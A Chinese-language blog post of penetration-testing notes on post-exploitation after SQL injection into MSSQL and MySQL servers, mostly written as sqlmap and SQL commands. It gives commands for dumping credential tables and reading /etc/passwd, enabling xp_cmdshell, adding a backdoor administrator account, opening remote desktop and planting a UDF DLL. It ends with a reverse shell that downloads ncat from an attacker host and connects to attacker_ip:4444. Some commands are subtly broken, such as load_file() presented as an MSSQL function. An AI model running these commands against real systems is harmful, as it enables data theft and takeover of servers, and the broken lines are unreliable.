---
layout: post
toc: true
title: "「SQL注入」:MSSQL-SHELL后利用笔记"
wrench: 2020-06-01
author: Bin4xin
categories:
    - blog
    - 漏洞复现
    - 笔记
    - CVE
    - Sql-Inject
    - MSSQL
permalink: /blog/2020/SQL/SHELL/
---

> 拿到SQL注入点后如何进一步利用？本文记录在MSSQL环境下通过sqlmap获取sql-shell后的常见操作，包括信息收集、权限判断、xp_cmdshell执行命令、以及os-shell的使用。

## 0x00 sqlmap基础注入

```bash
# 获取当前用户
sqlmap -r request.txt --current-user

# 列出数据库
sqlmap -r request.txt --dbs

# 列出指定数据库的表
sqlmap -r request.txt -D target_db --tables

# 列出指定表的列
sqlmap -r request.txt -D target_db -T users --columns

# 导出数据
sqlmap -r request.txt -D target_db -T users -C id,username,password --dump

# 读取服务器文件
sqlmap -r request.txt --file-read="/etc/passwd"
```

## 0x01 sql-shell信息收集

进入sql-shell后，可以执行SQL语句进行信息收集：

### 数据库版本和系统信息

```sql
-- 查看数据库版本
sql-shell> select @@version
'Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64)
Apr  2 2010 15:48:46
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1)'

-- 查看当前用户
sql-shell> select user_name()
sql-shell> select system_user
```

### 判断SA权限

```sql
-- 返回1表示当前用户是sysadmin角色
sql-shell> select IS_SRVROLEMEMBER('sysadmin')
select IS_SRVROLEMEMBER('sysadmin'):    '1'
```

> `IS_SRVROLEMEMBER('sysadmin')`返回`1`说明当前用户拥有SA权限，可以执行xp_cmdshell等高权限操作。

### 判断xp_cmdshell是否存在

```sql
-- 检查xp_cmdshell扩展存储过程
sql-shell> select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell';
select count(*):    '1'
```

返回结果不为`0`即说明存在`xp_cmdshell`扩展存储过程。

### 列出数据库

```sql
-- 列出所有数据库
sql-shell> SELECT name FROM master..sysdatabases

-- 列出当前数据库的表
sql-shell> SELECT name FROM sysobjects WHERE xtype='U'

-- 列出表中的列
sql-shell> SELECT name FROM syscolumns WHERE id=OBJECT_ID('tablename')
```

### 读取文件

```sql
-- 读取服务器文件
sql-shell> select load_file('C:\\Windows\\System32\\drivers\\etc\\hosts')

-- 使用sqlmap的file-read
sqlmap -r request.txt --file-read="C:\Windows\win.ini"
```

## 0x02 xp_cmdshell执行命令

当确认存在SA权限和xp_cmdshell时，可以直接执行系统命令：

```sql
-- 执行系统命令
sql-shell> Exec master..xp_cmdshell 'whoami';
```

### 遇到的问题：stacked queries不支持

```bash
sql-shell> Exec master..xp_cmdshell 'whoami';
[WARNING] execution of non-query SQL statements is only available when stacked queries are supported
```

> **原因**：sqlmap的sql-shell模式下，`EXEC`等非查询语句需要支持stacked queries（堆叠查询）。如果目标不支持stacked queries，sqlmap无法直接执行xp_cmdshell。

**解决方案**：

1. 使用`--os-shell`代替sql-shell
2. 使用`--sql-shell`配合`OPENROWSET`等技巧
3. 直接使用sqlmap的`--os-cmd`参数

### 启用xp_cmdshell

如果xp_cmdshell被禁用，需要先启用：

```sql
-- 启用高级配置选项
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- 启用xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### 常见命令执行

```bash
# 查看当前权限
Exec master..xp_cmdshell 'whoami';

# 查看网络配置
Exec master..xp_cmdshell 'ipconfig /all';

# 查看用户列表
Exec master..xp_cmdshell 'net user';

# 添加管理员用户
Exec master..xp_cmdshell 'net user hacker P@ssw0rd /add';
Exec master..xp_cmdshell 'net localgroup administrators hacker /add';

# 开启3389远程桌面
Exec master..xp_cmdshell 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f';
```

## 0x03 os-shell使用

sqlmap的`os-shell`模式可以更方便地执行命令：

```bash
sqlmap -r request.txt --os-shell

# 或者指定技术
sqlmap -r request.txt --os-shell --technique=EU
```

os-shell原理：
1. 上传一个WebShell到服务器（通常利用`INTO OUTFILE`或`xp_cmdshell`写文件）
2. 通过WebShell执行命令

> **注意**：os-shell需要目标Web目录可写，且知道Web根目录的绝对路径。

## 0x04 MySQL UDF提权

当目标为MySQL时，可以通过UDF（用户自定义函数）提权：

```sql
-- 查看插件目录
sql-shell> show variables like '%plugin%';

-- 写入UDF DLL
sql-shell> SELECT unhex('hex_content') INTO DUMPFILE 'C:/phpStudy/MySQL/lib/plugin/udf.dll';

-- 创建自定义函数
sql-shell> CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';

-- 执行系统命令
sql-shell> SELECT sys_eval('whoami');
```

sqlmap方式：

```bash
# 直接通过sqlmap的MySQL连接
sqlmap -d "mysql://root:password@target:3306/test" --os-shell
```

## 0x05 文件读取

```bash
# MSSQL - 使用sqlmap读取文件
sqlmap -r request.txt --file-read="C:\Windows\System32\drivers\etc\hosts"
sqlmap -r request.txt --file-read="C:\Windows\win.ini"

# sql-shell方式
sql-shell> select load_file('C:\\Windows\\win.ini')

# MySQL方式
sql-shell> SELECT LOAD_FILE('/etc/passwd')
```

## 0x06 反弹Shell

拿到命令执行权限后，反弹shell到攻击机：

### MSSQL反弹

```bash
# 使用ncat反弹
Exec master..xp_cmdshell 'powershell IEX (New-Object Net.WebClient).DownloadString("http://attacker/ncat.exe") -o ncat.exe & ncat.exe -e cmd.exe attacker_ip 4444'

# 使用certutil下载工具
Exec master..xp_cmdshell 'certutil -urlcache -split -f http://attacker/ncat.exe C:\Windows\Temp\ncat.exe & C:\Windows\Temp\ncat.exe -e cmd.exe attacker_ip 4444'
```

### 攻击机监听

```bash
nc -lvnp 4444
```

## 参考

- [sqlmap官方文档](https://sqlmap.org/){:target="_blank"}
- [MSSQL渗透测试备忘录](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql){:target="_blank"}
- [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection){:target="_blank"}

以上。